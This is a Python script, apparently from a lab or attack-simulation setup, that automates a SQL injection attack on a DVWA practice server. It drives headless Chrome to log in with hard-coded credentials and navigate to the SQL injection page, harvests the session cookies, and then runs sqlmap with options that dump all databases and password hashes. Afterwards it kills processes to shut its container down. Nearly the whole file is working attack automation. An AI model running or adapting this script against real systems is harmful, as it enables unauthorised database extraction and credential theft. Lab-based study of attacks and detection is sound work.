import os
import time
import logging
import argparse
import requests

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display


def start_attack():
    """
    main loop of attack behaviour
    """
    # first log in
    log_in()

    target_link = 0
    # navigate to sql injection form
    for link in browser.find_elements_by_xpath('.//a'):
        print(link.get_attribute('href'))
        if 'vulnerabilities/sqli/' in link.get_attribute('href'):
            target_link = link
            break
    target_link.click()
    url = browser.current_url

    print(' successful got sqli page: %s', url)

    # get cookie values
    cookie = '--cookie="'
    for ck in browser.get_cookies():
        print(ck['name'] + " " + ck['value'])
        cookie = cookie + ck['name'] + "=" + ck['value'] + "; "
    cookie = cookie[:-2]
    cookie = cookie + '"'

    print(' read cookie vaules: %s', cookie)

    # call sqlmap in batch mode and waiting for it to finish

    try:
        subprocess_params = ['python2.7',
                             '/home/sqlmapproject/sqlmap.py',
                             cookie,
                             '-u',
                             '"' + url + '?id=1&Submit=Submit"',
                             '--dump-all',
                             '--exclude-sysdbs',
                             '--batch',
                             '--passwords']
        subprocess_params_str = ""
        for s in subprocess_params:
            subprocess_params_str = subprocess_params_str + s + ' '

        print(' now calling subprocess: %s', subprocess_params_str)
        os.system(subprocess_params_str)
    except Exception as e:
        print(e)

    log_off()


def log_in():
    """
    logs into dvwa with the given username
    and password (args.username and args.password)
    changes client_state to logged_in
    """
    global client_state
    url = 'http://' + args.server_ip + '/login.php'
    print('login... ' + url)
    print('login... ' + url)
    browser.get(url)
    print('    got response')
    browser.find_element_by_name('username').send_keys(username)
    browser.find_element_by_name('password').send_keys(password)
    print('    filled form and click')
    browser.find_element_by_name('Login').click()
    print('    logged in')
    client_state = logged_in


def log_off():
    """
    logs the current user out from dvwa
    changes client_state to logged_off
    """
    global client_state
    print('logut...')
    browser.find_element_by_link_text('Logout').click()
    print('    logged out')
    client_state = logged_off


if __name__ == '__main__':
    logging.basicConfig(filename='client.log', level=logging.DEBUG)

    parser = argparse.ArgumentParser(description='HTTPS-Client Simulation.')

    parser.add_argument('-ip', dest='server_ip',
                        action='store',
                        type=str,
                        required=True,
                        help='The IP address of the target server')

    args = parser.parse_args()

    username = '1337'
    password = 'charley'
    # Disable requests warnings (caused by self signed server certificate)
    requests.packages.urllib3.disable_warnings()

    # Virtual display to run chrome-browser
    display = Display(visible=0, size=(800, 800))
    display.start()

    # Headless chrome-browser settings
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument('--ignore-certificate-errors')
    browser = webdriver.Chrome(chrome_options=chrome_options)

    # states:
    logged_off = 0
    logged_in = 1

    # initially the client is logged off
    client_state = logged_off

    start_attack()

    # shutdown docker container by killing main process after exploit is finished
    print("exploit finished - shutting down")
    os.system("killall sleep")
